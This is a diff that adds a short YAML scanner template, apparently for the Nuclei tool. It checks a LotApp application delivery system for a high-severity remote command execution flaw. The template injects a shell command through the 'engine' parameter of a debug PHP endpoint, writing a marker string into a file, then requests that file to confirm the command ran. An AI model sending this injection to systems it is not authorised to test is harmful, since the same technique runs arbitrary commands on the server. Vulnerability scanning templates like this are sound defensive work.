@@ -1,0 +1,21 @@
+id: lotapp-rce
+info:
+  author: Str1am
+  name: "LotApp\u5E94\u7528\u4EA4\u4ED8\u7CFB\u7EDF\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
+  severity: high
+  tags: lotapp,rce
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - 54dhnbd545845fvbgdtgfn
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/acc/debug/bytecache_run_action.php?action=1&engine=test%27|echo%2054dhnbd545845fvbgdtgfn>1.txt||%27a'
+  - '{{BaseURL}}/acc/debug/1.txt'
